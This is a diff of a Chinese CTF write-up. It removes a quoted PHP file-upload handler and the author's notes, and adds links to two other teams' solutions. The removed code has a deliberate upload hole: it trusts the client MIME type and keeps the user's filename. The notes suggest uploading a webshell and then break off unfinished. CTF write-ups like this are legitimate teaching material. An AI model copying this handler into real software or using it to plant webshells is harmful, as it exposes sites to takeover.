-        exit();
-    }
-
-    if (isset($_FILES["file"])) {
-        $filename = $_FILES["file"]["name"];
-        $fileext = ".gif";
-        switch ($_FILES["file"]["type"]) {
-            case 'image/gif':
-                $fileext = ".gif";
-                break;
-            case 'image/jpeg':
-                $fileext = ".jpg";
-                break;
-            default:
-                echo "Only gif/jpg allowed";
-                exit();
-        }
-        $dst = "upload/" . $_FILES["file"]["name"] . $fileext;
-        move_uploaded_file($_FILES["file"]["tmp_name"], $dst);
-        echo "文件保存位置: {$dst}<br />";
-    }
-    ?>
-    <html>
-
-    <head>
-        <meta charset="UTF-8">
-    </head>
-
-    <body>
-        我们不能让选手轻而易举的搜索到上传接口。<br />
-        即便是运气好的人碰巧遇到了，我相信我们的过滤是万无一失的(才怪
-        <form method="post" enctype="multipart/form-data">
-            <label for="file">来选择你的文件吧:</label>
-            <input type="file" name="file" id="file" />
-            <br />
-            <input type="submit" name="submit" value="Submit" />
-        </form>
-
-    </body>
-
-    </html>
-```
-
-11、可以看到似乎有文件上传漏洞，传个马上去试试。
-
-12、靶机关了没整了，等复现了。
+由于联系不上作者：故此处引两个WP的链接
++ [解法一：作者：zsx](https://xz.aliyun.com/t/4906#toc-10)  
++ [解法二：作者：七月火](https://xz.aliyun.com/t/4904#toc-3)
 
 ## Misc
 **作者：wu1a**
